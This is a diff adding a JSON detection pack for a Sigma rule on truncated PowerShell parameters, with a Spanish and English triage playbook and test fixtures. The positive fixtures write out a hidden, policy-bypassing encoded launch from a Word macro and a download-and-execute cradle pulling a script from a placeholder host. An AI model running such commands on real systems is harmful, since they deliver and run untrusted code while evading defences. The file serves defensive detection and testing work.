@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "36210e0d-5b19-485d-a087-c096088885f0",
+    "title": "Suspicious PowerShell Parameter Substring",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)",
+    "path": "windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se inició PowerShell (powershell.exe o pwsh.exe) con parámetros truncados como -NoPro, -win hid, -ep bypass o -ec. Esta abreviatura es habitual en lanzadores maliciosos que buscan evadir detecciones basadas en nombres completos de parámetros.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image termina en \\powershell.exe o \\pwsh.exe y CommandLine contiene una forma abreviada, con guion o barra, de -WindowStyle Hidden, -NoProfile, -NonInteractive, -EncodedCommand o -ExecutionPolicy Bypass.",
+      "why_it_matters": "PowerShell acepta cualquier prefijo único de un parámetro. Los atacantes lo aprovechan para ejecutar scripts ocultos, codificados o que omiten la política de ejecución (ATT&CK T1059.001, Command and Scripting Interpreter: PowerShell). Así suelen operar descargadores y loaders de malware.",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique ventana oculta, bypass de política, payload codificado (-ec/-en) o descargas (IEX, DownloadString, Invoke-WebRequest).",
+        "Decodifique cualquier payload Base64 (UTF-16LE) en un entorno aislado y busque URLs, IPs, rutas o comandos de segunda etapa.",
+        "Analice ParentImage: Office, wscript.exe, mshta.exe, un navegador o servicios web como padre son muy sospechosos; SCCM o un agente de gestión sugieren uso administrativo.",
+        "Valide el usuario y el host: ¿es una cuenta de servicio o de administrador esperada en ese endpoint?",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos, conexiones de red, archivos creados y cambios en Run keys o tareas programadas.",
+        "Busque la misma línea de comando o el mismo hash del script en otros hosts y revise alertas previas del usuario o del equipo.",
+        "Consulte los logs de PowerShell (Script Block Logging, Event ID 4104) para ver el contenido realmente ejecutado."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de inicio de sesión que usan abreviaturas como -ep bypass o -NoProf por costumbre.",
+        "Herramientas de gestión de software o RMM (SCCM, Intune, agentes de monitoreo) que lanzan PowerShell con parámetros cortos.",
+        "Instaladores de terceros que ejecutan comandos PowerShell codificados durante su instalación."
+      ],
+      "response_steps": [
+        "Confirme la legitimidad con el dueño del host o del script; si es legítimo y recurrente, documente una exclusión acotada por ParentImage y CommandLine.",
+        "Si es malicioso, aísle el endpoint desde el EDR y preserve memoria, el script decodificado y los artefactos relacionados.",
+        "Bloquee los dominios, IPs y hashes identificados y busque esos indicadores en todo el entorno.",
+        "Elimine la persistencia encontrada y restablezca las credenciales del usuario afectado si hubo exposición.",
+        "Restaure el equipo desde una imagen limpia cuando no se pueda garantizar la erradicación completa."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque truncar parámetros de PowerShell es poco común en uso legítimo y está fuertemente ligado a lanzadores ocultos o codificados."
+    },
+    "en": {
+      "summary": "PowerShell (powershell.exe or pwsh.exe) was started with truncated parameters such as -NoPro, -win hid, -ep bypass or -ec. Malicious launchers often use these abbreviations to evade detections that look for full parameter names.",
+      "what_it_detects": "Process creation events where Image ends with \\powershell.exe or \\pwsh.exe and CommandLine contains an abbreviated dash or slash form of -WindowStyle Hidden, -NoProfile, -NonInteractive, -EncodedCommand or -ExecutionPolicy Bypass.",
+      "why_it_matters": "PowerShell accepts any unique prefix of a parameter name. Attackers use this to run hidden, encoded or policy-bypassing scripts (ATT&CK T1059.001, Command and Scripting Interpreter: PowerShell). Downloaders and malware loaders commonly work this way.",
+      "triage_steps": [
+        "Read the full CommandLine: look for a hidden window, execution policy bypass, an encoded payload (-ec/-en) or download cradles (IEX, DownloadString, Invoke-WebRequest).",
+        "Decode any Base64 (UTF-16LE) payload in a safe environment and pull out URLs, IPs, paths or second-stage commands.",
+        "Check ParentImage: Office, wscript.exe, mshta.exe, browsers or web servers are highly suspicious; SCCM or management agents suggest admin use.",
+        "Validate the user and host: is this an expected service or admin account on that endpoint?",
+        "Pivot on the same host within +/- 15 minutes: child processes, network connections, dropped files, Run keys and scheduled tasks.",
+        "Hunt for the same command line or script hash on other hosts and review earlier alerts for the user or host.",
+        "Check PowerShell Script Block Logging (Event ID 4104) for the content that actually ran."
+      ],
+      "false_positives": [
+        "Admin or logon scripts that habitually use shorthand like -ep bypass or -NoProf.",
+        "Software management or RMM tools (SCCM, Intune, monitoring agents) launching PowerShell with short parameters.",
+        "Third-party installers that run encoded PowerShell commands during setup."
+      ],
+      "response_steps": [
+        "Confirm legitimacy with the host or script owner; if benign and recurring, document a narrow exclusion on ParentImage and CommandLine.",
+        "If malicious, isolate the endpoint via EDR and preserve memory, the decoded script and related artifacts.",
+        "Block identified domains, IPs and hashes and sweep the environment for those indicators.",
+        "Remove any persistence found and reset the affected user's credentials if exposure is likely.",
+        "Reimage the host if full eradication cannot be assured."
+      ],
+      "severity_rationale": "High fits because truncated PowerShell parameters are uncommon in legitimate use and strongly associated with hidden or encoded launchers."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Word spawns powershell.exe with truncated hidden-window, bypass and encoded-command parameters (matches ' -NoPro ', ' -win hid ', ' -ep bypass', ' -ec ').",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoPro -win hid -ep bypass -ec VwByAGkAdABlAC0ASABvAHMAdAAgAHQAZQBzAHQA",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jperez\\Downloads\\factura.docm\""
+        }
+      },
+      {
+        "description": "pwsh.exe launched from wscript.exe with slash-style truncated parameters (matches ' /NoProf ' and ' /ep bypass').",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "CommandLine": "pwsh.exe /NoProf /ep bypass /c \"iex (irm https://updates.example.com/a.ps1)\"",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "wscript.exe C:\\Users\\mlopez\\AppData\\Local\\Temp\\run.vbs"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Scheduled admin script using full parameter names; no truncated substring from the rule appears.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"
+        }
+      },
+      {
+        "description": "Truncated parameter string passed to cmd.exe, not PowerShell; the Image condition fails.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "cmd.exe /c echo -ep bypass -NoPro test > C:\\Temp\\notes.txt",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
